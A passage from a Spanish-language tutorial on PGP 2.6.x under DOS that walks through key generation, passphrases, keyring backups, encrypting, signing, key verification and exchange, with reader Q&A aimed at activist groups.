puede hacerlo para los diversos individuos de ella usando las claves individuales de cada 
uno. Se verá más adelante cómo se hace esto.
A.La frase que irá embebida en la llave
O sea la frase clave o contraseña que servirá para abrir la llave privada (secreta). Una frase 
no muy corta. Que no se adivine fácilmente. Que no sea una frase hecha. Que tenga algunos 
signos de puntuación, números o caracteres de la tabla de ASCIIs simples. Pueden ser palabras 
sueltas, combinaciones de letras y signos que no hagan sentido ¡Pero no la vayan a olvidar!
Se entiende de lo que se trata: que se conserve secreta, que no la adivinen cuando los vean 
teclearla, que tampoco sea demasiado larga porque habrá ocasiones en que tendrán que 
escribirla varias veces. Que si se les olvida la puedan reconstruir. No conviene tenerla 
apuntada, o apuntarla de tal manera disfrazado el apunte que sólo el autor pueda entenderlo.
Una vez decidida la frase será bueno practicarla muchas veces hasta que el movimento de 
escribirla se automatice.
A.Nivel de seguridad
El nivel de seguridad está en relación con el tamaño de las claves que se generarán al 
cifrar cada vez. Ese tamaño medido en bits. Cuanto más grande el número de bits, también 
los procesos serán más lentos. Con la velocidad de las máquinas de ahora 1024 bits es 
razonablemente rápido y con mucha seguridad; la mayoría de los pegeperos (Zimmermann, 
Schumacher...) las hicieron de 1024
A.Generar el par de llaves
Teclear: pgp -kg
Y luego seguir las instrucciones que irá dando el PGP.
Tendrás al fin de este proceso tus dos llaves.
La pública en pubring.pgp
La secreta en secring.pgp
Son además ya los llaveros público y secreto a los que posteriormente podrás añadir nuevas 
llaves. Las públicas de otros, y otras secretas, si te quieres complicar la vida generando 
varios pares de llaves. Si te llamas Pedro Pérez, pero un círculo de gente te conoce como 
"El Gallo" y ni saben que eres Pedro podrás tener dos pares de llaves: dos llaves secretas 
en secring.pgp y muchas en pubring.pgp Pero por ahora no nos metamos en eso. Vendrá en el 
capítulo VIII al tratar de manejo de llaveros.
NOTA:	Se habrá  notado que he estado usando "llave" "llavero" para los archivos, y clave 
para la frase. El instructivo en castellano habla de clave para los archivos, de contraseña 
para la frase y de anillo para los llaveros. El "identificador" es tu nombre o parte de él.
A.Qué hacer con los 2 archivos: pubring.pgp y secring.pgp
Lo primero es hacer una copia de ambos en disquete. Un disquete que tengas guardado bajo llave, o bien escondido. Esto es importante por cualquier eventualidad de perder la información de tu compu. Si falla tu disco duro, si un virus te borra esta información, si te distraes y formateas tu disco sin querer, si se daña físicamente alguna parte del disco en donde estén estos archivos, si te roban tu laptop, si...
Si a tu máquina no tienen acceso otros más que tú, pueden quedarse los dos archivos en 
c:\pgp. 
Si otros tienen acceso a tu máquina, bórralos y cada vez que los vayas a necesitar cópialos 
a c:\pgp y al terminar vuélvelos a borrar. En este caso es bueno que hagas dos copias de tus 
llaveros en dos disquetes, una en cada uno. Una de respaldo y otra de uso.
No es ésta la mejor solución. Mejor sería tener todo el programa PGP en un disquete bien 
guardado fuera de la compu, y al ir a utilizar el PGP ponerlo en el tocadiscos correspondiente 
(a: b:) y dar los comandos desde allí. Esto supone cierta destreza en el manejo del DOS, 
y puede ser un tema al tratar de cifrar y descifrar archivos que están en un directorio 
distinto al directorio a:\pgp o al c:\pgp.
Otra solución es tener todo el programa en c:\pgp sin los archivos pubring.pgp secring.pgp 
y randseed.bin. Estos se tienen en un disquete aparte y en el config.txt se instruye a pgp 
que busque esos archivos en el tocadiscos a: o en el b: según el caso.
No es aquella primera la mejor solución porque borrar un archivo no es quitar la información 
de la computadora. Sólo se borra la letra inicial del nombre y se declara en la tabla FAT 
que ese espacio está libre para grabar encima de lo que haya allí. Habría que borrar con 
wipefile de Norton, o algo similar.
I.Practicar el cifrado y descifrado a la manera tradicional
A. Por qué esta práctica
Porque es útil para guardar cifrados textos y archivos en la propia computadora. No hay 
necesidad de utilizar llaves, pues sólo se utilizará una clave consistente en una frase. 
No debe ser la frase embebida en las llaves pública y privada propias, para no arriesgarse 
a comunicar esa clave si es que se le dice a otro la frase con que se cifró tradicionalmente 
un archivo determinado.
Porque se puede cifrar para quien no ha generado sus llaves, sea que se trate de una sola 
persona o de un grupo. Con el problema de comunicar de una manera segura la frase-clave 
sin que la conozcan otros.
Porque cifrar y descifrar varios archivos le va dando a uno destreza en el manejo del PGP.
B.Comandos para cifrar y descifrar
El comando para cifrar es:
pgp -c archivo.???
En el proceso de cifrar pedirá PGP que escribas la clave, y que la vuelvas a escribir como 
comprobación. Y el resultado será: archivo.pgp. Si al cifrar añades el parámetro -w, el 
archivo original no cifrado se borrará de tu disco. Sólo quedará en él el archivo.cifrado
El archivo que vas a cifrar puede tener cualquier terminación menos .pgp y conviene que 
tenga alguna, porque cuando descifres el archivo.pgp el resultado será archivo. 
(sin terminación).
El comando para descifrar es:
pgp archivo.pgp
Y el resultado será: archivo. (sin terminación) igual a archivo.???
Puedes cifrar cualquier clase de archivo: un texto en ASCIIs simples; un texto con 
formato de word, o de wordperfect, o de cualquier procesador por el estilo; un archivo 
de programa, aunque no se le ve mucha utilidad a esto último a no ser que sea un programa 
original tuyo o de otro que quieras proteger para que otros no lo copien. En el proceso de 
descifrar te pedirá el programa la clave, o frase contraseña.
A.Cifrar y codificar en ASCIIs simples
Los archivos .pgp no son aptos para ser tratados como texto por un manejador de correo 
electrónico. Hay programas de manejo de correo (yo conozco el llamado pine) que sí pueden 
transmitir archivos que no sean de ASCIIs simples, pero sometiéndolos a un proceso de 
codificación a ASCIIs simples, y mandándolos no como simple correo, sino como archivo pegado 
(attachement). Pero esto sólo funciona cuando quien recibe el correo tiene también un manejador de correo con la capacidad de descodificarlo. El codificador y descodificador que utiliza pine se llama mime.
El PGP tiene integrado un codificador que transforma cualquier archivo a uno equivalente en 
ASCIIs simples. Se añade el parámetro -a del siguiente modo:
cifras con el comando: pgp -ca archivo.???
Y el resultado será: archivo.asc. El archivo.asc estará cifrado y codificado en ASCIIs simples,
y podrá pasar por cualquier manejador de correo electrónico.
Descifras con el comando: pgp archivo.asc
Y el resultado será: archivo. (sin terminación) y será igual a archivo.???
A.Guardar tu llave pública en un archivo que sea tu_nombre.asc
Ya que hemos hecho ejercicio de generar archivos cifrados en ASCIIs simples, es conveniente 
también hacer un archivo en ASCIIs simples cuyo contenido sea el pubring.pgp. Así podrán 
pasarse por correo electrónico las llaves públicas.
Por haber generado tu par de llaves, tienes los archivos pubring.pgp y secring.pgp. Ahora 
sólo trataremos del primero, pues no tiene caso trabajar así con el secring.pgp, pues es un 
archivo que no se pasará nunca ni por correo ni de ninguna otra manera.
El comando es: pgp -a pubring.pgp
En el proceso se te preguntará que si ese archivo fue generado por PGP. Le dices que sí y 
el proceso proseguirá. El resultado será el archivo pubring.asc
Como hasta ahora el contenido de pubring.asc es sólo una llave pública, la tuya, puedes 
copiarlo como tu_nombre.asc. Y esa es tu llave pública en aptitud para transitar por correos 
electrónicos. Pero en realidad, a la corta o a la larga, no guardarás así simplemente tu llave 
pública para pasarla por correo-e, porque querrás mandarla hasta que otro de fe de ella o la 
autentifique con su firma. Asunto posterior del capítulo IV.
A.El PGP habla de "armadura" de ASCIIs
Porque utiliza la imagen de que ha metido un archivo en una armadura. Se metían en las 
armaduras para protegerse de los proyectiles enemigos (piedras, flechas, balas de arcabuz). 
Ahora se meten los astronautas en su traje espacial para protegerse del ambiente hostil que 
es la falta de atmósfera y de gravitación. Metemos los archivos .pgp en una armadura (.asc) 
para que puedan transitar por ese medio específico que son los correos electrónicos que dejan 
intactos los caracteres de la tabla de ASCIIs simples y o no entienden o modifican los demás. 
en el config.txt activamos la línea "armor = on", estamos instruyendo a PGP que siempre que se 
pueda meta en armadura de ASCIIs simples los archivos que genere.
I.Intercambiar llaves públicas
A.Conservar la propia llave pública
Si quiere uno conservar aparte por sí sola la propia llave pública se hace una copia del 
pubring.pgp con otro nombre. Por ejemplo jhdez.pgp. Así, si alguien  pide la llave pública 
se le copia el archivo jhdez.pgp en un disquete suyo. Es la manera directa de pasar la llave 
pública a otra persona. El tendrá la seguridad de que es la llave verdadera porque está seguro 
que se la copió el dueño en su disquete.
NOTA: Si tu pubring.pgp ya tiene varias llaves, hay otra manera de que extraigas de allí tu 
llave pública. Pero de esto se tratará más adelante.
El archivo jhdez.pgp, que es la copia de pubring.pgp cuando sólo tiene la llave pública de 
Juan Hernánez, no es capaz de transitar por el correo electrónico porque es un archivo en el 
que hay caracteres que no son lo que hemos llamado ASCIIs puros (del 33 al 127 de la tabla de
ASCIIs). Pero se puede meter jhdez.pgp en una armadura de ASCIIs puros con el comando:
pgp -a jhdez.pgp. El resultado será: jhdez.asc
Y este archivo sí puede transitar por el correo electrónico. Y es la manera como podemos pasar 
nuestras llaves públicas a otros por correo electrónico.
A.Guardar llaves públicas en el llavero propio
Quien recibe en su correo una llave pública la puede meter a su llavero público con la orden: 
pgp archivo.???, donde "archivo.???" es el nombre del archivo de su correo.
Por ejemplo: Yo recibí un correo que pasé a mi computadora como correo.txt. Ese correo es una 
llave pública. Con la orden pgp correo.txt me dirá el programa que el contenido es una llave 
pública y que si la quiero añadir a mi llavero. Si le digo que sí, aumentará mi pubring.pgp 
con esa nueva llave.
A.Certeza sobre que la llave es de quien dice que es
Pero nos topamos con un problema de seguridad. ¿Estoy cierto de que esa llave pública es 
verdaderamente de quien dice que es? ¿No se metió en la cuenta del amigo que me escribe 
otra persona y me está mandando una llave pública que no es la de él como si sí lo fuera?
 Cualquiera puede generar un par de llaves asumiendo cualquier nombre.
1.Solución por medio de la huella digital de la llave
Pedro Pérez me mandó por correo su llave pública y yo ya la añadí a mi pubring.pgp. 
Veo la huella digital de la llave de Pedro con el comando:
pgp -kvc pedro pubring.pgp.
la respuesta será una serie de números y letras que apunto y luego le telefoneo a Pedro Pérez. 
Estando seguro que es él porque le conozco la voz, y porque le llamé a su casa y por lo que 
platicamos, le digo que recibí su llave pública y que la huella digital es tal y tal. El 
checa con la misma orden de arriba en su llavero público y me dirá que sí o que no es, según 
el caso.
[La huella digital consiste en dos series de ocho números hexadecimales de dos guarismos cada 
uno]
1.Solución por medio de llaves firmadas, o autenticadas
Hablemos de Pedro Pérez, de Fernando Fernández y de Juan Juárez.
Pedro Pérez recibió por correo-e la llave de Fernando Fernández, y venía firmada (autenticada) 
por Juan Juárez. Por otra parte Pedro tiene en su llavero la llave pública de Juan recibida 
directamente del mismo Juan. Al descifrar con la orden pgp correo.txt el programa le dirá que 
es la llave de Fernando y que viene firmada por Juan. Si no tiene en su llavero la llave de 
Juan el informe que recibirá es que viene firmada por un firmante desconocido. Cuando añada 
a su llavero la llave de Juan todo se arreglará y Pedro tendrá la garantía dada por Juan de 
que la llave de Fernando es realmente de Fernando. Si Pedro le cree o no a Juan, es su bronca.
A.Guardar una llave recibida en formato llave.pgp y no en llave.asc
Pero yo no recibí por correo una llave. Me la dio en disquete su dueño y no viene en formato .
asc así que no puedo simplemente descifrarla con la orden pgp jhdez.pgp. ¿Cómo la añado a mi 
llavero?
La añado con la orden: pgp -ka jhdez.pgp pubring.pgp
Aquí supongo que "jhdez.pgp" es la llave pública tal como me la dieron quizá ya firmada por 
otro.
A.Cómo se firman las llaves
Cada uno puede firmar la o las llaves que tenga en su llavero. Para esto lo primero es 
incorporar al propio llavero la o las llaves que va uno a firmar. Por ejemplo: en mi 
llavero tengo las llaves mía y las de Pedro Pérez, Fernando Fernández y Juan Juárez. Y 
quiero firmar la de Juan. Procedo: pgp -ks Juan pubring.pgp
y va uno contestando las preguntas que vaya haciendo el programa. Al final queda firmada 
por mí la llave de Juan.
A.Cómo aislo la llave de Juan Juárez
Se aisla una llave para poder tenerla sola y pasarla a otros y al mismo Juan Juárez para 
que él la tenga (y pueda pasarla) con todo y mi firma.
con el comando: pgp -kx juan juan.pgp pubring.pgp
o si quiero el archivo en armadura de ASCIIs puros:
pgp -kxa juan juan.asc pubring.pgp
Y según la orden usada tendré la llave pública de Juan Juárez ya sea como juan.pgp, o como juan.
asc.
Sugerencia:
Varios que estén relacionados por su trabajo, o por cercanía geográfica, o por otros motivos 
pueden nombrar a uno que sea algo así como su notario oficial para autentificar las firmas de 
ese grupo. Ese "notario" debe ser conocido por varias de las gentes conocidas a su vez en su 
sistema de comunicación electrónica. El notario consigue en directo que los conocidos del 
sistema le autentifiquen su llave pública en forma directa con presencia personal; él, a 
su vez, irá autentificando por conocimiento directo las llaves públicas de los de su grupo. 
Pero sin que la firma de ese notario se convierta en obligatoria. Cada uno puede hacer 
certificar su llave pública de la manera que quiera. Los "notarios" son para ayudar, pero no 
para adquirir el control de la autenticidad de las llaves de determinado grupo.
A.Examinar nuestro llavero público
Con las llaves públicas que vamos recibiendo de otros se va enriqueciendo nuestro llavero 
pubring.pgp. Podemos, si así lo deseamos, asomarnos dentro del llavero para saber cuántas 
llaves tenemos y de quiénes.
La orden pgp -kv pubring.pgp 
da como resultado el contenido del llavero;
La orden pgp -kvm pubring.pgp
o bien: pgp -kv pubring.pgp | more
da el contenido del llavero, pero parte por parte. No pasa por la pantalla todo el contenido, 
sino que se va deteniendo pantalla por pantalla.
La orden pgp -kv pubring.pgp > archivo.txt
Da por resultado un archivo de texto con el contenido del llavero.
NOTA: En cualquiera de estos casos se puede añadir otra "v" a los parámetros del comando 
(-kvv, -kvvm). El resultado dará más detalles de información: también aparecerá con qué firmas 
está autenticada cada llave. Si en tu config.txt has instruido a PGP que siempre actúe con 
muchas palabras (verbose = 2), -kv funcionará como si fuera -kvv
-kv = ver el llavero
-kvv = ver el llavero con respuesta de más palabras ("verbose")
NO NOS CONTENTEMOS CON SABER ESTO. Practiquémoslo. Tómese cada uno el tiempo para examinar 
el contenido de su llavero público, pubring.pgp; para verlo en pantalla y para generar un 
archivo de texto, con menos y más información.
A.Observaciones
Algunos han puesto como identificador un nombre: Mauricio, javier. Esto dificultará cifrar 
documentos si es que hay otro Mauricio u otro Javier. ¿Cómo distinguirlos? Es bueno que 
pongan también su apellido. Pueden modificar su identificador con el comando:
pgp -ke identificador [llavero], o en concreto:
pgp -ke Mauricio pubring.pgp
Y seguir las instrucciones que vayan saliendo. Quedará una llave con dos identificadores. 
Luego habrá que quitar el identificador incompleto con la orden: pgp -kr mauricio pubring.pgp, 
y asímismo ir siguendo las instrucciones de PGP.
Alguno sólo ha puesto como identificador su nombre institucional. No es buena política la de 
que varios individuos compartan una misma llave con su clave (contraseña). La llave privada y 
la frase con que se abre ésta son secretos que deben ser muy bien guardados.
El formato de los identificadores suele ser:
fulano de tal <dirección electrónica>
Juan Hernandez <jhdez@servidor.unam.mx>
Si alguno no tiene dirección electrónica puede poner dentro de los paréntesis angulares, un 
número de teléfono, o un apodo, o algo que lo identifique a él solo.
A.Digresión de preguntas y respuestas
Esto no forma parte del instructivo en directo. Son preguntas y respuestas que tienen que 
ver con lo que va del instructivo.
(P/):	Hoy recibí tu mensaje y ya estuve practicándolo, primero saqué todas las firmas que 
venían en el programa (Zimmerman y demás).
(R/):	Te sirvió de ejercicio y eso es bueno. Supongo que te refieres a las que vienen en el 
programa como keys.asc. Son las de los productores y mantenedores del PGP. Yo lo que 
fue guardarlas como un llavero aparte. Hasta ahora no me he metido a explicar como hacer 
diversos llaveros. De hecho yo hice un llavero que llame "pgpjefes.pgp", con su poco de humor 
y puse allí todas esas llaves además de la mía.
	¿Como se hace? Con pgp -ka pubring.pgp pgpjefes.pgp, y cuando el PGP te pregunte si vas 
añadiendo tal y tal llave al llavero pgpjefes.pgp le vas contestando sí o no. Para esto debes 
tener activado en tu config.txt la linea interactive = on, porque si no, te pasa de golpe 
todas las llaves contenidas en keys.asc y tendrás que ir quitando una por una las que no 
quieras en el llavero pgpjefes.pgp.
	Te sirven para checar los programas de PGP que hayas bajado o los que puedas bajar 
en el futuro. También por si alguna vez le escribes en cifra a Zimmermann o algún otro de
 ellos. Yo he estado usando la de Armando Ramos, que es el que se ha encargado de hacer 
las traducciones al castellano. Pero mayor utilidad no creo que tengan.
P/:	¿Cómo firma mi llave pública otro con quien puedo estar en contacto directo?
R/:	Fulano tienen tu llave publica. Tú eres sutano. Entonces la firma él en su llavero:
	pgp -ks sutano pubring.pgp
Luego la extrae de su llavero:
	pgp -kx sutano sutano.pgp pubring.pgp, o:
	pgp -kxa sutano sutano.asc pubring.pgp
Luego te da la copia del archivo sutano.pgp o sutano.asc
Si es sutano.asc, con el simple descifrarlo irá a tu pubring.pgp. Si tu sutano.asc está en un 
disquete puedes usar la orden: pgp a:\sutano.asc.
Esto sucede si tienes en tu autoexec.bat el set pgppath = c:\pgp  o el directorio 
correspondiente.
Y luego distribuyes por el correo electrónico ese archivo sutano.asc, que es tu llave publica 
firmada por fulano, en armadura de ASCIIs simples.
Si es sutano.pgp, metes su contenido a tu llavero con:
pgp -ka sutano.pgp pubring.pgp
Y después extraes tu llave para el correo electrónico:
pgp -kxa pubring.pgp sutano.asc
P/:	En la llave de perengano que le firmé personalmente, hay varias firmas que aparecen como 
desconocidas, ¿a qué se debe eso, a que yo no las tengo como registradas o que las firmas en 
sí no están validadas? ¿Me expliqué o me hice bolas?
R/:	Para que el PGP reconozca una firma, tiene que estar la llave pública del que la firmó, 
en el mismo llavero. O sea, que deben estar en tu pubring.pgp las llaves públicas de los que 
firmaron la de perengano. Pero lo importante es que haya una a la que tú le confíes y entonces
 la firmas para ti en tu llavero. Luego podrás quitarle luna firma inútil con la orden::
pgp -krs perengano pubring.pgp
P/:	¿cómo puedo confirmar tu llave pública?
R/	La bronca está en qué tan cierto estás de que yo soy la persona que digo ser en el 
correo electrónico. Que no me estoy inventando una personalidad para el correo electrónico, 
ni que haya otra persona que se ha metido a mi cuenta de correo electrónico simulando que soy 
yo y así ha generado un par de llaves pública-secreta y ha estado comunicando la pública como
 si fuera mía. Podemos andar en trabajos y actividades por la paz, por los derechos humanos, 
etc., que no les caen bien a muchos sectores del gobierno y a otros con capacidad de organizar
 sus servicios de inteligencia. Supón que alguno de ellos logra hacerse pasar por mí, y al 
en muy buena onda da tiempo y trabajo a ayudar a los grupos de los que desea extraer 
información y vigilar. Y luego, ganada la confianza, saca la información que anda buscando.
	Por tanto la única manera de que puedas estar seguro de que mi llave pública que tienes
 es realmente mía es que te la dé en persona. O que alguien en quien tú confías te la dé en 
persona y la haya recibido de mí en persona. O que ese alguien en quien confias y de quien 
recibiste en persona su llave pública te mande, firmada por él, mi llave pública.
I.Cifrar archivos al modo del PGP
A.Cifrar para otros
Se cifra para otros con la orden:
	pgp -e archivo.??? fulano [otros], o como está en la ayuda:
		pgp -e fnormal identificador_des
Ejemplo: pgp -e carta.doc fulano
Así cifras "carta.doc" para fulano. El resultado, o sea, el archivo cifrado, será carta.pgp; 
De haber cifrado con pgp -ea, el resultado habría sido carta.asc. Y si hubieras usado el 
parámetro -w el archivo original no cifrado se habría borrado de tu disco.
A.Pero salen varias dudas
1.Hay dos o más que tienen el mismo identificador
Para evitar identificadores repetidos se usa como identificador o bien una palabra que no se 
repita en la lista con ningún otro, o emplear algo más largo que una sola palabra. 
Por ejemplo, para Juan Hernández <jhdez@servidor.unam.mx> el identificador puede ser juan o 
hernandez  o jhdez. Usar el que no se repita con otros. Puede haber una llave de Juan Martinez
 o de Pedro Hernandez. Ya no puedo usar ni 'Juan', ni 'Hernandez' como identificador.
Las comillas vienen en nuestra ayuda. Puedo escribir "juan hernandez" (con las comillas) como 
identificador. (Hay otro modo de identificar llaves. Ver más adelante: IX D)
1.Cifrar para varios
Sabemos que se pueden poner uno tras otro muchos identificadores. Pero hay un límite: el 
renglón del comando no puede ser de más de 127 caracteres. Si la lista de aquellos para 
los que quiero cifrar es grande, y más si he de usar identificadores largos agrandados 
las comillas y de varias palabras, me paso del límite permitido en una sola línea de comando.
La versión 2.6.3i tiene una solución, que no está en la versión 2.6.2i. En ésta no queda más
 remedio que cifrar varias veces y luego tener cuidado de mandar lo cifrado precisamente a 
aquellos para los que se cifró cada vez. Bien molesto y con peligro grande de equivocaciones.
 Y no se puede mandar lo mismo a toda la lista. Y por esta razón se aconseja que cambien a 
la versión 2.6.3i.
En la versión 2.6.3i se pone como identificador el nombre de un archivo de texto precedido 
por -@ Y por otro lado se escribe un archivo de texto con los identificadores, uno en cada 
renglón. Así, la orden para muchos será: pgp -e carta.doc -@llaves.txt
Con el supuesto de que llaves.txt es un archivo con la lista de los identificadores. Un 
ejemplo:
Juan hernandez (sin necesidad de comillas)
pedro hernandez (sin necesidad de comillas)
fulano
sutano
perengano
armando flores (sin necesidad de comillas)
1.Cómo firmar el texto además de cifrarlo
Se añade el parámetro -s. Enviando un archivo cifrado sé que sólo el o los destinatarios podrán 
leerlo. Recibiendo un archivo firmado sé que realmente proviene de quien dice que me lo manda, 
puesto que tengo su llave pública. Sin ella recibiría el mensaje de "firmante desconocido".
pgp -es archivo.??? identificador [otros identificadores]
Y para meterlo en armadura de ASCIIs puros:
pgp -esa archivo.??? identificador [otros identificadores]
1.Si mi archivo por cifrar es muy grande
Si el archivo que se va a cifrar y meter en armadura de ASCIIs simples es grande, pueden 
resultar dos o mas archivos cifrados y numerados. Si cifré el archivo cartas.doc podrán 
resultar: cartas.as1, cartas.as2,
1.Un escrito muy confidencial
¿Puedo cifrar mi carta confidencial de tal modo que quien la reciba sólo la pueda leer en 
su pantalla y no se grabe en su computadora?
Sí. Es como decirle: "este texto se borrará una vez que lo leas. No se grabará. Si quieres 
volver a verlo lo tienes que descifrar de nuevo." Se supone que se trata de un texto legible 
directamente en pantalla.
La orden es con el parámtero -m:
pgp -e[s][a][w]m carta.txt identificador. 
Va la [s] entre corchetes para indicar que puede o no firmarse el documento según uno quiera 
poniendo o no ese parámetro. Lo mismo la [a] por si quiere uno o no usar la armadura de ASCIIs.
Si quieres que tu archivo original se borre en tu máquina añades el parámetro -w{wipe}
A.Otra digresión de preguntas y respuestas
P/:	Ahora bien, más importante aún es continuar utilizando este sistema entre nosotros/as 
para que llegue el momento en que sea la forma común de enviarnos TODOS los mensajes. Esto 
nos evitará llamar la atención a los "ojos" y "oídos" invisibles.
R/:	Sin duda que lo que sugieres es una buena política de seguridad. Es un poco más de 
trabajo, esto de cifrar todo antes fuera de línea. Existe un programa para manejar el PGP 
en combinación con lectores fuera de linea. Hay también programas que cifran lo que se va 
a mandar por correo-e y lo descirfran al recibirlo.
P/:	No me funcionó el comando: pgp -esa carta.doc -@llaves.txt. El que sí me funciona es:
pgp -esa carta.doc fulano sutano (etc.)
R/:	No te funciona ese parámetro (-@llaves.txt) porque no tienes la ultima versión del PGP 
que es la 2.6.3i. Esta posibilidad de usar este parámetro es de las cosas nuevas de la versión 
última.
	El comando pgp -esa carta.doc fulano sutano (etc) tiene la limitante de que la línea de 
comando del PGP admite un máximo de 127 caracteres. Además, claro, de la que dices de que no 
siempre se acuerda uno de poner todos los identificadores. Por eso la insistencia en que 
consigamos esta nueva versión.
I.Descifrar los archivos recibidos
A.Caso ordinario
Conocemos ya la orden, que es la más sencilla del PGP, puesto que no lleva parámetro ninguno. 
La conocemos por haber ejercitado el cifrado y descifrado a la manera tradicional. Y es: pgp 
archivo.???
La extensión del archivo por descifrar será generalmente o bien pgp o bien asc. Pero puede ser
otra, como cuando bajas de tu correo un archivo con un nombre dado por ti. El resultado del 
descifrado será un archivo sin extensión ninguna. Descifras, por ejemplo, el archivo carta.
asc, y el resultado será el archivo carta.
Si tienes un archivo híbrido en el que hay texto abierto, y texto o textos cifrados, o alguna 
llave pública, el PGP es lo suficientemente ducho como para ir distinguiendo los diversos 
componentes. Y te irá guiando en lo que hay que hacer. 
A.Situaciones especiales al descifrar
1.Quiero leer el archivo descifrado en mi pantalla, sin que se grabe en mi disco.
Esto evidentemente sólo se aplica si estoy seguro de que lo que estoy por descifrar es un 
archivo de texto legible directamente en pantalla. Se utiliza el parámetro -m. La orden es:
		pgp -m carta.txt
Y de todos modos tendrás la opción de guardar en un archivo lo que hayas leído pantalla por 
pantalla. Podrás darle un nombre que incluya una ruta para que se grabe en otro directorio.
1.Me llegaron varios archivos cifrados con el mismo nombre y extensiones en serie: carta.as1, 
carta.as2, carta.as3...
Esto quiere decir que el pgp al cifrar un archivo produjo más líneas que las marcadas como 
límite en el config.txt y fue entonces construyendo uno o varios archivos de ése número de 
líneas y el último más corto. 
Por correo-e los recibo de varias formas:
En una sola sesión bajo todo mi  correo en un solo archivo. Éste puede traer texto ordinario 
y mensajes cifrados. Para el manejo de estos, simplemente descifro ese archivo que es todo mi
 correo. El programa sabrá qué hacer con él, y si vienen varios trozos del mismo archivo 
cifrado en su orden natural, el PGP lo descifrará sin dificultad, Mandará un mensaje de error
 y advertencia si no están en su orden debido.
En la misma sesión ví que había varios mensajes pegepeados y los "subjects" me lo avisan. 
Los voy bajando con el mismo nombre: carta.as1, carta.as2... Y luego para descifrarlos los
 uno en solo archivo con la orden de DOS:
copy carta.as1+carta.as2+carta.as3 carta.asc
Y así me resultará el archivo carta. asc, que es el que descifraré.
No hay ninguna indicación. Entonces yo examino el correo pegepeado, y allí vendrá, dentro de 
cada correo, la indicación de qué número de serie es. Y esto antes o después de bajarlo. 
Fuera de línea hago la fusión como arriba con copy y sumas.
1.Al descifrar me dice el PGP que el archivo está firmado, pero que el firmante es desconocido
Esto quiere decir que no tengo en mi llavero la llave pública de quien cifró para mí el 
archivo recibido. De todos modos lo podré descifrar.
I.Firmar archivos de texto abierto
En ocasiones lo que nos importa no es que no se pueda leer un texto que escribimos, pero sí
 que quien lo recibe tenga la seguridad de que ese texto salió de nosotros y no tiene 
absolutamente ningún cambio. O sea, mandar un texto firmado, pero no cifrado.
A.Para qué firmar sin cifrar
Para comunicar algunas instrucciones que otro con quien sólo nos comunicamos por correo 
electrónico las ejecute, con la seguridad de nuestra parte de que no fueron modificadas 
por nadie, ni en el camino, ni por el mismo que las recibió. Que no haya eso de que tú 
me lo escribiste así.
Para mandar disquete con instrucciones o cualquier otro escrito del que queremos que quien 
lo reciba esté seguro dee que nada ha cambiado. El correo que transporta el disquete podrá
 cambiar el texto, pero si lo hace, el PGP dará el mensaje de firma inválida.
Para que un convenio quede escrito y las dos o más partes involucradas en él tengan la
 certeza de que todos manejan el mismo texto y precisamente el texto en el que quedaron de 
acuerdo. Y esto sin necesidad de que hagan la firma del convenio en el mismo lugar y al 
mismo tiempo. Puede hacerlo cada uno en su lugar a su conveniencia. Supongamos que tú yo
 hemos estado hablando sobre un convenio que queremos quede escrito y firmado por ambos. 
Pero cuando hablamos no tuvimos todavía la posibilidad de perfilar todos los detalles, porque 
había que consultar a otras personas o datos en el lugar donde vivimos o hemos estado 
negociando los términos del convenio sólo por correo electrónico. Cuando yo ya llegué a 
la redacción del convenio a mi satisfacción y pienso que también a la tuya, escribo el 
convenio, lo pgpfirmo y te lo mando. Si tú estás de acuerdo lo pgpfirmas y me lo mandas así. 
Los dos tenemos el mismo texto firmado por ambos. Cuando tú compruebas mi firma el PGP te 
genera un texto sin firmar cuyo nombre de archivo queda sin extensión. Recibo "convenio.txt" 
firmado por ti, leo el aviso de que la firma es buena y de que tengo un archivo que se llama 
"convenio.". (Es igual a convenio.txt pero sin la firma.) Éste es el que firmo y te mando.
En general usaremos la pgpfirma de igual manera que la firma manuscrita. Claro que no 
exactamente igual porque ni los bancos ni los notarios ni los tribunales aceptan todavía 
estas firmas como buenas. Siempre las legislaciones van atrás y a veces muy atrás de la vida.
A.Condiciones para pgpfirmar un texto abierto
Que el texto esté en ASCIIs simples. Con la versión 2.6.3i pueden usarse los caracteres de 
texto de los conjuntos de caracteres de 7 y 8 bits para textos. Esto concretamente significa 
para nosotros que los textos que se irán a firmar pueden llevar acentuadas, ñs y signos de 
abrir interrogación y admiración. Y el PGP se encargará de avisar cuál es el conjunto de 
caracteres que está uno usando. Será el que esté declarado en el config.txt. Si revisan el 
config.txt que copié en I E verán que existe la línea: CharSet = cp850.
Que decidamos si vamos a querer la firma con o sin armadura de ASCIIs. En el fondo creo que 
será bueno que siempre sea en armadura porque puede uno necesitar de pronto enviarlo por 
correo electrónico, y por otra parte la función de firmado es la misma.
Que tengamos nuestra llave privada (que es secreta) en el secring.pgp
B.Procedimiento
Utilizar la orden: pgp -tas carta.txt. El PGP usa tu llave secreta y por eso necesita abrirla
 y te pregunta tu clave. El resultado será carta.asc, o, si no usaste el parámetro -a, 
carta.pgp. Vale la pena que por vía de ejercicio pgpfirmes algunos documentos en una forma 
y en otra y luego los examines y veas los diversos resultados.
Tener en tu config.txt activados los renglones:
Armor = on	# Use -a flag for ASCII armor whenever applicable
TextMode = on	# Attempt to use -t option where applicable
equivale a escribir los parámetros -at. Si PGP detecta que hay caracteres que no pertenecen 
a ningún conjunto para textos, meterá a la armadura no sólo la firma, sino también el texto.
A.Comprobar la firma
El mismo procedimiento que para descifrar: pgp carta.asc, o: pgp carta.pgp
El programa te dirá después de una comprobación si la firma es buena o no y te dará un pequeño 
informe. Además te generará un archivo sin terminación que es lo que te llegó firmado, 
sin la firma. Y éste es el que firmas tú para mandármelo a mi si se trata de un convenio. Así, 
yo tendré el convenio firmado por ti y tú por mí. 
A.La pgpfirma en archivo separado del texto
Es posible pgpfirmar un texto de modo que resulte un archivo con la sola firma separada del 
texto. Al comprobar una firma así con la orden pgp firma.asc pedirá el programa que se indique 
el archivo al que se refiere esa firma. Si se lo escribimos correctamente y tenemos ese archivo sin ninguna modificación, dirá que la firma es buena.
La ventaja principal es para cuando se quiere firmar un convenio de más de dos. Si el convenio 
es entre cinco, no habrá que tener cinco textos firmados cada uno con cada una de las cinco 
. Un sólo texto y cinco archivos de firmas. Pero ¡Ojo! Nos irán llegando las firmas con el 
mismo nombre: carta.asc. Tener cuidado de renombrarlos, por ejemplo, carta01.asc, carta02.
asc... , Pero es mejor que cada uno al firmar d´´e un nombre específico a la firma separada. 
Por ejemplo, cartajh.asc (jh son las iniciales de Juan Hernández) en vez de sólo carta.asc.
Se obtiene la firma por separado con la orden pgp -sba carta.txt y el resultado es carta.asc, 
